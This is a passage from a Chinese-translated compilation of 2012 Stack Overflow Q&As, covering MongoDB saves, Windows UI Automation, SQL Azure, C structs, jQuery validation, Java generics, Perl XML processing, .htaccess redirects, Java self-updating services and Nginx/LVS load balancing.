// @include  http://YOUR_SERVER/YOUR_PATH/*
// ==/UserScript==

var targID      = "foo";
var targLink    = document.querySelector ("#" + targID);
targLink.href  += targID + "\/"; 
```

# mongodb - save 方法是否仅在保存现有对象时更新传递的字段？

> ID：10239899
> 
> 赞同：1
> 
> 时间：2012-04-20T03:36:41.110
> 
> 标签：mongodb, nosql

假设我将这个对象保存在 MongoDB 中：

```
{ "hello" : "goodbye", "_id" : ObjectId("4f90c9106aee6e21b4e55c65"), "test" : "world" }; 
```

我愿意

```
db.table.save({"_id" : ObjectId("4f90c9106aee6e21b4e55c65"), "test" : "changed value"}); 
```

它会更新现有记录吗？（测试的值将被“更改”，其余的将保持不变），或者创建一个新的？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T03:43:54.660

是的。如果您传递 _id 并使用“保存”，它将更新它。

```
> db.test.insert({ "hello" : "goodbye", "_id" : ObjectId("4f90c9106aee6e21b4e55c65"), "test" : "world" });
> db.test.save({"_id" : ObjectId("4f90c9106aee6e21b4e55c65"), "test" : "changed value"});
> db.test.find();
{ "_id" : ObjectId("4f90c9106aee6e21b4e55c65"), "test" : "changed value" } 
```

对不起，错过了你问题的第二部分。你正在寻找这个：

```
db.test.update({_id: ObjectId("4f90c9106aee6e21b4e55c65")}, {$set:{test:"changed value"}}); 
```

# wpf - 是否可以以编程方式填写 Windows 凭据提示？

> ID：10239900
> 
> 赞同：0
> 
> 时间：2012-04-20T03:37:08.230
> 
> 标签：wpf, winapi, windows-authentication, credentials

健壮性、稳定性和*你不应该这样做*的问题，有没有人通过代码填写过 Windows 凭证提示（所以看起来像这样：）

![windows安全提示](../Images/6ddf1082ed2fc24230525e68da514d89.png)

是否可以通过 Win32 API 或使用 SendKeys/发送鼠标/UI 自动化与这些对话框进行交互？任何人的任何想法/提示将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T03:44:42.870

使用[AHK（自动热键）](http://www.autohotkey.com/)之类的东西，它是一种可以编译为 EXE 的简单语言，旨在实现键盘和鼠标的自动化。

或者您可以从 WPF 执行此操作：http: [//social.msdn.microsoft.com/Forums/en-US/wpf/thread/6fc7f1f6-f3e2-4b32-9d2b-9c7a2680e04a/](http://social.msdn.microsoft.com/Forums/en-US/wpf/thread/6fc7f1f6-f3e2-4b32-9d2b-9c7a2680e04a/)

或者用户可以简单地勾选“记住我的凭据”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T07:45:58.287

我最终使用了[UI 自动化框架](http://msdn.microsoft.com/en-us/library/ms747327%28v=vs.85%29.aspx)，它允许我获取对凭据提示的引用，然后填写并以这种方式完成。

代码片段：

```
AutomationElement desktop = AutomationElement.RootElement;
//get all windows on the desktop
AutomationElementCollection windows = desktop.FindAll(TreeScope.Descendants, new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Window));
         foreach (AutomationElement window in windows)
        {
            if (window.Current.ClassName.Equals("#32770"))   //security dialog
            {

                // access the appropriate AutomationElements to enter credentials here

            }
        } 
```

要与元素交互，您需要获取适当的 Pattern 对象并调用它的方法（例如，文本框有一个 ValuePattern，它有一个 .SetValue() 方法。

我还使用 UISpy 查找 ClassNames、AutomationIds 等的所有值，以帮助通过 .FindAll() 和 PropertyConditions 对象找到正确的项目。

# azure - 了解 SQL Azure 连接

> ID：10239908
> 
> 赞同：0
> 
> 时间：2012-04-20T03:38:22.793
> 
> 标签：azure, azure-sql-database

我将单个数据库部署到 SQL Azure。没有部署托管服务，并且我没有在本地运行可以连接到它的任何东西，但是当我查看 Web 管理时，它说有 14 个打开的连接。

此外，当我查看查询性能时，它显示了几十个我没有编写的查询。

SQL Azure 是否在后台执行某些操作？这是正常的吗？我怎样才能弄清楚这 14 个连接来自哪里？我并不真正担心任何事情，但我只是想了解这里发生了什么。

```
insert #t1 (object_id, object_name, object_schema, object_db, object_svr, object_type, relative_id, relative_name, relative_schema, relative_db, relative_svr, relative_type, schema_bound, rank, dep_type)
   select object_id, object_name, object_schema, object_db, object_svr, object_type, relative_id, relative_name, relative_schema, relative_db, relative_svr, relative_type, schema_bound, rank , dep_type
   from #t2 where @iter_no + 1 = rank 
```

![在此处输入图像描述](../Images/e0a6369a00c0e390741eaca9966e11fa.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T05:34:52.030

嗯，

我不确定这些联系来自哪里。但是，您知道 SQL Azure 为故障转移和 DR 保留 3 个数据库的实时副本。这些可能就是那些联系。好吧，当您连接时，您肯定至少有一个连接，而且这个 SQL Azure 管理器可能会在后台使用更多连接。您看到的查询很可能是用于向您显示下一个选项卡（性能）的查询。如果您碰巧通过 SQL Azure 管理器四处走动，那么连接池中很容易已经有 14 个连接（SQL Azure 管理器是一个 Silverlight 应用程序，它使用 WCF 服务，所以我想有一个 using(conn) for每个服务电话。）。如您所见，只有一个活动用户，我确定是您登录的用户。

我检查 SQL Azure 上发生了什么是使用[sp_who3](http://sqlserverplanet.com/dmv-queries/a-better-sp_who2-using-dmvs-sp_who3)存储过程。

# javascript - 拖动图像的Opera问题如何禁用预览

> ID：10239910
> 
> 赞同：0
> 
> 时间：2012-04-20T03:38:36.773
> 
> 标签：javascript, browser, cross-browser, opera

我有一组图像，比如 9 个 3x3 网格。我希望用户将鼠标放在图像上并将其拖动到网格中的另一个图像以“交换”或将其拖动到两个图像之间以插入点。

在 IE、Chrome、FF、Safari 中一切正常。Opera 虽然仍然显示拖动图像的不透明“预览”，但我已在所有其他`return false`用于该`ondragstart`事件的浏览器中成功抑制了该图像。Opera返回的图像也向右偏移了`100px`大约，可能与我的CSS有关。

但是，我不在乎人们复制我的图像，这是为了提供功能。我需要不透明的拖动不在 Opera 中显示。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:32:44.460

如果您使用的是 html5 d'n'd，则无法阻止显示拖动反馈（规范至少没有指定任何 IINM）。不过，您可能需要调用数据传输的 setDragImage() 并将图像设置为中性的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T11:49:47.693

您是否可以提供您正在使用的 HTML、CSS 和 JS？你自己处理 d'n'd 还是想使用 HTML5 d'n'd （从 ondragstart 片段中的'return false' 我带你自己做，因为看起来你取消了取消 html5 d'n'd 的 ondragstart )? 如果您使用 addEventListener() 注册 ondragstart，则需要调用 preventDefault() 来取消 d'n'd。

# c - C中的链接列表节点，结构原型

> ID：10239911
> 
> 赞同：4
> 
> 时间：2012-04-20T03:38:41.700
> 
> 标签：c, struct, linked-list

我正在开发一个嵌入式系统，我需要实现一个链表。

所以我使用了一个结构来构造一个节点

```
typedef struct A
{
   ... //some data
   struct A *next;
   struct A *prev;
} A; 
```

我认为在 PC (gcc) 上可以正常工作。但是，嵌入式系统编译器抱怨“未声明标识符 A”......

什么是最好的解决方案？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-20T03:40:59.727

您应该添加一个单独的结构*前向声明*：

```
struct A;
typedef struct A
{
    ... //some data
    struct A *next;
    struct A *prev;
} A; 
```

一些编译器确实按照您发布它的方式采用您的定义，但我见过需要单独前向声明的旧编译器。这可能与较旧的标准或不完整的标准实施有关。事实上，在一个项目中，我们需要编写在具有不同编译器的五个平台上运行的代码，我们将前向声明与结构的 typedef 分开作为公司范围内的编码标准要求。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T03:40:24.527

您可以将其拆分：

```
typedef struct A A;

struct A {
   ... //some data
   struct A *next;
   struct A *prev;
}; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T09:12:43.710

原始代码应该编译得很好。您可能正在使用非标准编译器。作为其他建议的替代方案，您可以尝试以下代码：

```
typedef struct a
{
   ... //some data
   struct a *next;
   struct a *prev;
} A; 
```

这样，您就不需要前向声明。

# jquery - jQuery 语法令人困惑

> ID：10239917
> 
> 赞同：0
> 
> 时间：2012-04-20T03:39:49.280
> 
> 标签：jquery, syntax, jquery-validate

我已将我的代码上传到 js bin 并收到以下错误我不确定如何修复它们，但我认为这是由于我试图用来`},`传递我的 id 值。

```
Line 7: required: true; --- Expected '}' to match '{' from line 6 and instead saw ';'.
Line 10: required: true; --- Expected '}' to match '{' from line 9 and instead saw ';'.
Line 12: }, --- Expected an identifier and instead saw '}'.
Line 13: errorPlacement: function(error, element) { --- Expected ')' and instead saw ':'.
Line 13: errorPlacement: function(error, element) { --- Missing semicolon.
Line 13: errorPlacement: function(error, element) { --- Missing name in function declaration.
Line 21: }); --- Expected '(end)' and instead saw '}'.

jQuery(document).ready(function() { 
    //Home Validation
    $("#quote").validate({
        onfocusout:true,
          rules:{
                companyName:{
                    required: true;
                },
                companyAddress:{
                    required: true;
                },
            },
            errorPlacement: function(error, element) {
                if(element.is("textarea")) {
                    error.appendTo(".textareaError");
                }else{
                    error.appendTo(".error");
                }
            }
    });
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T03:49:50.597

我删除了第 7 行和第 10 行的分号以及第 11 行的逗号。

```
jQuery(document).ready(function() { 
    //Home Validation
    $("#quote").validate({
        onfocusout:true,
          rules:{
                companyName:{
                    required: true
                },
                companyAddress:{
                    required: true
                }
            },
            errorPlacement: function(error, element) {
                if(element.is("textarea")) {
                    error.appendTo(".textareaError");
                }else{
                    error.appendTo(".error");
                }
            }
    });
}); 
```

# c++ - 关于编码电话号码生成应用电话号码的建议以0开头

> ID：10239918
> 
> 赞同：0
> 
> 时间：2012-04-20T03:40:05.080
> 
> 标签：c++, visual-c++-2010

您好，我想知道是否有人可以在这里帮助我，我是编程新手并尝试编写一个程序来生成从 0 开始的电话号码，网络提供商以 0803 开头，总共 11 个号码。我想生成一些营销数据。错误说，无效的八进制数字，但我希望它能够工作，所以我不需要自己添加零

```
1\.  #include iostream
2\.  #include fstream
3\.  using namespace std;
4\.  int main()
5\.  {
6\.  long numb = 08030000000;
7\.  ofstream generated_numb;
8\.  for(int i = 08030000000; i < 08040000000; i++)
9\.  {
10\. generated_numb.open("mtn_numbers.txt");
11\. generated_numb << i << endl;
12\. generated_numb.close();
13\. }
14\. while(true){}
15\. return 0;
16\. } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T03:47:00.920

出于各种原因，最好将电话号码作为字符串处理。

您遇到的错误是几种计算机语言用`0`. 要写入十进制数，请从数字 1 到 9 开始。

电话号码通常包含各种标点符号，例如`.` `,` `-` `(`和`)`开头。某些电话公司内部号码包含“数字”`A`到`D`。此外，PBX 中的分机号码通常由`x`.

（回复第一条评论）

这样的事情将实现您的意图，因为您的要求是非通用电话号码处理：

```
FILE *f = fopen ("mtn_numbers.txt", "w");
if (!f)
    fprintf (stderr, "error opening output file\n");
else
{
    for (long n = 0;  n < 10000000;  ++n)
        fprintf (f, "0803%07Ld\n", n);
    fclose (f);
} 
```

# java - 如何实例化一个通用集合数组？

> ID：10239919
> 
> 赞同：1
> 
> 时间：2012-04-20T03:40:05.363
> 
> 标签：java, arrays, list, generics

为什么这段代码会出现错误？

```
List<String>[] l = new ArrayList<String>[10]; 
```

Eclipse 说我无法创建通用数组，但实际上我正在尝试创建一个集合数组。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T03:46:11.917

它与收藏无关。（原始）数组构造函数不能采用参数化类型。

尝试

```
List[] l = new ArrayList[10]; 
```

（感谢@newacct）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T05:48:17.100

请尝试这样

```
List<String>[] al = new ArrayList[10];
al[0] = new ArrayList<String>();
al[1] = new ArrayList<Date>(); // Give u error because List accepts only String 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T03:46:58.190

像这样尝试： List[] l = new List[10]; 然后将 ArrayList(s) 添加到您的 List 数组中......简单的数组不能保存泛型信息。它早在泛型之前就被包含在语言中......

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T03:56:49.750

根据[语言规范，第 15.10 节](http://docs.oracle.com/javase/specs/jls/se7/html/jls-15.html#jls-15.10)：

> “数组创建表达式创建的对象是一个新数组，其元素属于 PrimitiveType 或 ClassOrInterfaceType 指定的类型。如果 ClassOrInterfaceType 不表示可具体化的类型，则会出现编译时错误。”

根据[语言规范，第 4.7 节](http://docs.oracle.com/javase/specs/jls/se7/html/jls-4.html#jls-4.7)：

> 由于某些类型信息在编译过程中会被删除，因此并非所有类型在运行时都可用。在运行时完全可用的类型称为可具体化类型。
> 
> 当且仅当满足以下条件之一时，类型才是可具体化的：
> 
> *   它指的是非泛型类或接口类型声明。
> 
> ...

所以简单地说，“因为语言说你不能”。我了解维护向后兼容性的最终原因，但我不熟悉细节。

# xml - 使用 Perl XML::SAX 修改 XML 文档

> ID：10239920
> 
> 赞同：0
> 
> 时间：2012-04-20T03:40:15.773
> 
> 标签：xml, perl, sax

我正在尝试使用 XML::SAX 来修改 XHTML 文档的某些部分，但是我的所有尝试都失败了。

这是我正在尝试做的事情：

```
#!/usr/bin/perl 
package MyHandler;
use strict;
use warnings;

use base qw(XML::SAX::Base);
use Data::Dumper;

sub start_element {
    my $self = shift;
    my $data = shift;

    if( $data->{LocalName} eq 'span') {
        $data->{LocalName} = 'naps';
    }

    $self->SUPER::start_element($data); # GOOD (and easy) !
    #print Dumper($data); 
}

1;

#============================
#Main programm
#============================
use strict;
use warnings;

use XML::SAX::ParserFactory;
use XML::SAX::Writer;

my $out;

my $o = XML::SAX::Writer->new( Output => \$out );
my $h = MyHandler->new( Handler => $o );
my $p = XML::SAX::ParserFactory->parser(Handler => $h);

my $data;
{ local undef $/ }; $data = <DATA>;
$p->parse_string( $data );
print $out;

__DATA__
<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:wicket="http://wicket.apache.org/dtds.data/wicket-xhtml1.4-strict.dtd">
<body>
<wicket:panel>
    <form wicket:id="mvpForm">
        <span>Edit Information: </span>
        <input type="checkbox" wicket:id="editForm"/>

        <span>Name: </span>
        <span wicket:id="name"></span>
        <input type="text" wicket:id="nameEdit"/>

        <span>Last Name: </span>
        <span wicket:id="lastName"></span>
        <input type="text" wicket:id="lastNameEdit"/>

        <span>DOB: </span>
        <span wicket:id="dob"></span>
        <input type="text" wicket:id="dobEdit"/>

        <span>Occupation: </span>
        <span wicket:id="occupation"></span>
        <input type="text" wicket:id="occupationEdit"/>

        <span>Gender: </span>
        <span wicket:id="gender"></span>
        <span wicket:id="genderEdit"/>

        <input type="submit" wicket:id="submit"/>

    </form>
</wicket:panel>
</body>
</html> 
```

基本思想是将每个“span”更改为“naps”，并将生成的修改后的 XML 写入 STDOUT。

另外，很高兴看看是否可以使用 SAX 合并 xml 块，换句话说，如果我发现一个特定的元素被扩展为其他东西，我如何将它与输出到 STDOUT 的输出合并？

例如来自：

```
<xmltag>
    <expandable/>
</xmltag> 
```

到：

```
<xmltag>
    <expanded>
        This is an expanded element
    </expanded>
</xmltag> 
```

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T07:14:44.423

SAX 不是进行此类琐碎更改的最佳工具。考虑一个 DOM 实现。

```
use strictures;
use XML::LibXML qw();
my $dom = XML::LibXML->load_xml(…);

for my $e ($dom->findnodes('//*')) {
    $e->setNodeName('naps') if 'span' eq $e->nodeName;
    if ('expandable' eq $e->nodeName) {
        $e->setNodeName('expanded');
        $e->appendText('This is an expanded element');
    }
}
print $dom->toString; # ->toFile 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T09:49:40.827

这是一个基于[XML::Twig](http://search.cpan.org/~mirod/XML-Twig-3.39/Twig.pm)的解决方案，我发现它比 SAX 更易于使用（但我可能有点偏颇 ;--)。它非常节省内存，因为只有 1 个`span`（或`expandable`）元素保存在内存中。

```
#!/usr/bin/perl

use strict;
use warnings;

use XML::Twig;

XML::Twig->new( twig_roots => { span       => sub { $_->set_tag( 'naps')->flush; },
                                expandable => sub { XML::Twig::Elt->new( expanded => 'this is an expanded element')->print; },
                              },
                twig_print_outside_roots => 1,
              )
          ->parsefile( \*DATA);
__DATA__
<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:wicket="http://wicket.apache.org/dtds.data/wicket-xhtml1.4-strict.dtd">
<body>
<wicket:panel>
    <form wicket:id="mvpForm">
        <span>Edit Information: </span>
        <input type="checkbox" wicket:id="editForm"/>

        <span>Name: </span>
        <span wicket:id="name"></span>
        <input type="text" wicket:id="nameEdit"/>

        <span>Last Name: </span>
        <span wicket:id="lastName"></span>
        <input type="text" wicket:id="lastNameEdit"/>

        <span>DOB: </span>
        <span wicket:id="dob"></span>
        <input type="text" wicket:id="dobEdit"/>

        <span>Occupation: </span>
        <span wicket:id="occupation"></span>
        <input type="text" wicket:id="occupationEdit"/>

        <span>Gender: </span>
        <span wicket:id="gender"></span>
        <span wicket:id="genderEdit"/>

        <input type="submit" wicket:id="submit"/>

    </form>

<xmltag>
    <expandable/>
</xmltag>

</wicket:panel>
</body>
</html> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T07:13:26.623

似乎**Writer**从 Key **Name**而不是**LocalName**中选择元素名称。因此，与其修改**LocalName** ，不如修改**Name**以获得所需的结果。

```
if( $data->{LocalName} eq 'span') {
    $data->{LocalName} = 'naps';
} 
```

将其更改为

```
if( $data->{LocalName} eq 'span') {
    $data->{Name} = 'naps';
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-21T06:47:52.253

要回答我自己关于合并/扩展元素的问题，这里有一个关于如何使用 sax 进行操作的片段：

```
#!/usr/bin/perl 
package MyHandler;
use strict;
use warnings;

use base qw(XML::SAX::Base);
use Data::Dumper;

use XML::SAX::ParserFactory;
use XML::SAX::Writer;

sub start_element {
    my $self = shift;
    my $data = shift;

    if( $data->{LocalName} eq 'expand') {
        $self->{in_include}++;
        my $p = XML::SAX::ParserFactory->parser( Handler => $self );
        $p->parse_string( "<expanded>This is my expanded tag</expanded>" );
        return;
    }

    #$data->{Attributes} = undef;
    $self->SUPER::start_element($data);
    #print Dumper($data); 
}

sub characters {
    my $self = shift;
    my $data = shift;

    #print "Data is $data->{Data}" if defined $data->{Data}; 
    $self->SUPER::characters($data);
}

sub end_element {
    my ($self, $element) = @_;
    if ($element->{LocalName} eq "expand") {
        $self->{in_include}--;
    } else {
        $self->SUPER::end_element($element);
    }
}

sub start_document { # same for end_document
    my($self, $data) = @_;
    return if($self->{in_include});
    $self->SUPER::start_document($data);
}

sub end_document { # same for end_document
    my($self, $data) = @_;
    return if($self->{in_include});
    $self->SUPER::end_document($data);
}

1;

#============================
#Main programm
#============================
use strict;
use warnings;

use XML::SAX::ParserFactory;
use XML::SAX::Writer;

my $out;

my $o = XML::SAX::Writer->new( Output => \$out );
my $h = MyHandler->new( Handler => $o );
my $p = XML::SAX::ParserFactory->parser(Handler => $h);

my $data;
{ local undef $/ }; $data = <DATA>;
$p->parse_string( $data );
print $out;

__DATA__
<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:wicket="http://wicket.apache.org/dtds.data/wicket-xhtml1.4-strict.dtd">
<body>
<wicket:panel>
    <form wicket:id="mvpForm">
        <span>Edit Information: </span>
        <input type="checkbox" wicket:id="editForm"/>

        <span>Name: </span>
        <span wicket:id="name"></span>
        <input type="text" wicket:id="nameEdit"/>

        <span>Last Name: </span>
        <span wicket:id="lastName"></span>
        <input type="text" wicket:id="lastNameEdit"/>

        <span>DOB: </span>
        <span wicket:id="dob"></span>
        <input type="text" wicket:id="dobEdit"/>

        <span>Occupation: </span>
        <span wicket:id="occupation"></span>
        <input type="text" wicket:id="occupationEdit"/>

        <span>Gender: </span>
        <span wicket:id="gender"></span>
        <span wicket:id="genderEdit"/>

        <input type="submit" wicket:id="submit"/>

        <expand/>

    </form>
</wicket:panel>
</body>
</html> 
```

标签将`<expand/>`被替换`<expanded>This is my expanded tag</expanded>`。

基本上只需要创建一个新的解析器并将一个文件/字符串交给它来解析。但是，请注意有几个问题。第一个是停止传播您截获要扩展的标签的事件。换句话说，不要在扩展/嵌套标签时调用 $self->SUPER::start/end_element，这将防止被替换的标签最终出现在输出中。其次，需要拦截 start_document/end_document 并跳过调用父级，否则会产生以下错误：

> 尝试在 /usr/share/perl5/XML/NamespaceSupport.pm 第 79 行，块 1 处弹出上下文而不推送上下文。

换句话说，一些清理失败：

 *> *触发此消息是因为 XML::NamespaceSupport 对 start_document 事件进行了一些初始化，并对 end_document 事件进行了一些清理。问题在于，在您的代码中，主文档会有一对这样的事件，而每个包含的文档都会有一对嵌套事件。当第二个 end_document 事件发生时，没有什么要清理的——因此是消息。* [取自这里](http://osdir.com/ml/lang.perl.xml/2003-10/msg00030.html)*

# c++ - 如何使用 c++ graphviz 库将参数传递给点布局引擎？

> ID：10239929
> 
> 赞同：0
> 
> 时间：2012-04-20T03:41:52.823
> 
> 标签：c++, graphviz

当运行我的 c++ 程序时，它会出现错误，告诉 -Gcharset=latin1 需要用于布局引擎。那么在调用gvLayout(context, graph, "dot")的时候怎么给它传参数呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T08:25:42.713

您可以[`agsafeset`](http://www.graphviz.org/pub/graphviz/development/doxygen/html/attribs_8c.html#acc1333bd692dea2cf05882f9f610c3c3)用于设置正确的字符编码，例如：

```
agsafeset(graph,"charset","Latin1",""); 
```

# .htaccess - 将根（且仅根）URL 重定向到另一个域？

> ID：10239930
> 
> 赞同：4
> 
> 时间：2012-04-20T03:42:29.557
> 
> 标签：.htaccess, redirect, dns

我希望将我的域 example.com 和 www.example.com 重定向到[http://example2.com](http://example2.com)，但我想保留对我在[http://example.com/sdfhs](http://example.com/sdfhs)上的帖子的所有访问以继续到他们的目的地。

本质上，我只想重定向根域和 www 域，而其余部分保持不变。

如何使用 .htaccess 执行此操作？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-06-20T16:24:43.373

不知道您是否还有这个问题，但我已经在我的一个域（Yourls 安装）上遇到了这个问题。尝试：

```
RewriteEngine On
RewriteRule ^$ http://www.example.com/ [R=301,L] 
```

它适用于我的安装，但请在您的网站上查看。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T04:07:54.107

为什么不

```
RewriteEngine On
RewriteCond ${HTTP_HOST} example\.com|www\.example\.com
RewriteRule ^/?$ http://example2.com [L] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-20T16:35:12.950

通过启用 mod_rewrite 和 .htaccess `httpd.conf`，然后将此代码放在您`.htaccess`的`DOCUMENT_ROOT`目录下：

```
Options +FollowSymLinks -MultiViews
# Turn mod_rewrite on
RewriteEngine On
RewriteBase /

RewriteCond ${HTTP_HOST} ^(www\.)?example\.com$ [NC]
RewriteRule ^$ http://example2.com [L,R=301] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T04:03:11.257

您可以简单地匹配任何具有至少 1 个字符的 URL，`(.+)`并将其标记为重写引擎要查看的最后一条规则`[L]`。然后将其他任何内容重定向`(.*)`到新域（唯一不匹配到该点的其他内容将是根）。

```
RewriteEngine On
RewriteRule ^(.+)$ - [L]
RewriteRule ^(.*)$ http://example2.com/$1 [R=301,L] 
```

# java - 如何使 Java 应用程序自我更新？

> ID：10239936
> 
> 赞同：26
> 
> 时间：2012-04-20T03:42:52.897
> 
> 标签：java, deployment, installation, auto-update, automatic-updates

**问题**：我有一个独立的 Java 应用程序（以下称为“代理”）作为服务在公司内部服务器上运行。它充当某些中央服务器的远程代理。随着代理部署在更多地方，管理它们变得越来越复杂。具体来说：推送更新很痛苦，因为它是一个相当手动的过程，并且访问有关代理运行环境的日志和其他信息是有问题的，使得调试变得困难。讨论中的服务器是无头和无人值守的，这意味着这必须是一个完全自动化的过程，没有人工干预，因此**Java Web Start 不是一个可行的解决方案**。

**建议的解决方案**：定期让代理电话回家（到中央服务器）以提供代理状态并检查更新。

我对解决该问题的其他建议解决方案持开放态度，但我已经有了“状态和自我更新”想法的工作原型，这就是这个问题的重点。

我想出的实际上是一个单独的项目，它充当代理的包装器。包装器定期通过 HTTP 调用中央服务器以检查代理的更新版本。找到更新后，它会下载新版本，关闭正在运行的代理，然后启动新代理。如果这似乎是一个奇怪或迂回的解决方案，这里有一些值得注意的其他注意事项/约束：

1.  当包装器获得新版本的代理时，可能会有新的 JAR 依赖项，这意味着类路径发生了变化，这意味着我可能想要生成一个单独的 Java 进程，而不是摆弄 ClassLoaders 并冒着永久代内存泄漏的风险，这需要人工干预——这正是我想要摆脱的。这就是为什么我最终使用了一个单独的“包装”流程来管理原型中的代理更新。
2.  部署代理的一些服务器资源有限，因此任何解决方案都需要降低 CPU 和内存使用率。这让我想要一个不涉及启动新 JVM 的解决方案，并且反对拥有一个单独的包装进程。
3.  该代理已经部署到 Windows 和 RHEL 服务器，因此解决方案必须是跨平台的，尽管我不会有问题在批处理和 bash 脚本中复制合理数量的过程以使事情顺利进行。

**问题**：如前所述，我想知道如何制作一个自我更新的 Java 应用程序。更具体地说，是否有任何框架/库可以帮助我解决这个问题？有这方面经验的大神可以指点一下吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T23:09:31.370

如果您的应用程序是基于 OSGi 的，您可以让 OSGi 为您处理包更新。它类似于您建议的包装器方法，因为 OSGi 容器本身就是“包装器”，其中一些不会被更新。[这是对此](https://stackoverflow.com/questions/4330927/how-does-osgi-bundle-update-work)的讨论

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-20T23:12:25.990

不同的解决方案：使用（并付费）install4j。[在此处](http://www.ej-technologies.com/products/install4j/features.html)查看自动更新功能

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-06-18T02:18:12.877

不需要包装器（节省内存）或 java web start（对您的应用程序添加更多限制），只需让应用程序中的线程定期检查更新（例如从云）并下载更新（如果可用），然后在您的代码中编写这两个调用应用：

1.  启动一个 shell 脚本 (`.sh`或`.cmd`) 以更新您的工件并在脚本暂停几秒钟后启动您的应用程序（以避免同时有两个应用程序实例）。
2.  终止您的应用程序（第一个实例）

该脚本可以覆盖所需的工件并重新启动您的应用程序。

请享用 ！

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-20T03:52:24.387

看看 Java Web Start。

它是自... 1.5 以来一直是Java 一部分的技术？也许1.4？并允许通过 Web 浏览器部署和安装基于 Java 的独立应用程序。它还使您能够始终运行最新的应用程序。

[http://www.oracle.com/technetwork/java/javase/overview-137531.html](http://www.oracle.com/technetwork/java/javase/overview-137531.html)

[http://en.wikipedia.org/wiki/JNLP#Java_Network_Launching_Protocol_.28JNLP.29](http://en.wikipedia.org/wiki/JNLP#Java_Network_Launching_Protocol_.28JNLP.29)

另请参阅此问题：[向 Java Swing 应用程序添加自我更新功能的最佳方法是什么？](https://stackoverflow.com/questions/207557/whats-the-best-way-to-add-a-self-update-feature-to-a-java-swing-application)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-20T03:51:34.037

似乎[Webstart](http://docs.oracle.com/javase/1.5.0/docs/guide/javaws/developersguide/faq.html)是目前唯一内置的方法。

# node.js - 用于 Node.js 负载平衡的 Nginx 或 LVS？

> ID：10239944
> 
> 赞同：3
> 
> 时间：2012-04-20T03:43:33.770
> 
> 标签：node.js, nginx, load-balancing

我们的项目需要对 node.js 做 TCP 包负载均衡。

建议是：（Nginx 或 LVS）+ Keepalived + Node Cluster

![在此处输入图像描述](../Images/8ddd6f51d753972fbdb965948a2928db.png)

问题：

1.  与 TCP 服务器的高并发客户端连接需要长期存在。Nginx 和 LVS 哪个更合适？
2.  我们需要为 Master 服务器上的节点 master 分配不同的优先级（本地服务器的优先级会高于远程服务器）。哪个可以做到这一点，Nginx 或 LVS？
3.  Nginx 还是 LVS，谁的 CPU 利用率更小，吞吐量更高？
4.  Nginx 和 LVS 之间的性能基准测试/功能比较有什么推荐的文档吗？

最后，我们怀疑我们的提议是否合理。还有其他更好的建议或组件可供选择吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T07:22:24.017

我假设您不需要 nginx 来服务器静态资产，否则 LVS 将不是一个选项。

1) nginx 仅支持 TCP 通过 3rd 方模块[https://github.com/yaoweibin/nginx_tcp_proxy_module](https://github.com/yaoweibin/nginx_tcp_proxy_module) 如果你不需要网络服务器，我会说 LVS 更合适，但请参阅我在#末尾的附加评论会回答。

2）LVS支持优先级，nginx不支持。

3）可能是LVS：nginx是用户态，LVS内核。

4）谎言，该死的谎言和基准。您必须在设备上模拟负载，编写节点客户端脚本并完善您的设置。

我们正在考虑将所有节点从前到后进行[https://github.com/LearnBoost/up](https://github.com/LearnBoost/up) 尚未投入生产，但我们正在追求这条路线，原因如下：

1）我们也有优先级要求，但它们是自定义的并且是动态变化的。我们正在运行时调整优先级，我们用了不到一个小时的时间来对节点进行编程。

2）我们部署了大量的代码更新，up 允许我们在不中断现有客户端的情况下完成它。因为您可以对其进行编码以做任何您想做的事情，所以我们可以启动全新的流程来处理新的连接，并在现有的连接全部消失时让旧的流程消失。

3）我们可以看到一切，因为我们将任何我们想看到的指标推送到 redis 服务器中。

我确信它不是每个进程/服务器性能最高的，但是拥有如此多的程序控制的优势是值得的，并且横向扩展具有更多冗余的优势，因此我们不会考虑挤出最后一点性能堆栈。

我只是快速检查一下是否可以复制/粘贴一堆代码，但我们正在快速对其进行编码，并且它有很多不适合公众消费的东西的引用。

# python - 在嵌入式终端中发出命令

> ID：10239965
> 
> 赞同：4
> 
> 时间：2012-04-20T03:46:24.647
> 
> 标签：python, button, window, tkinter

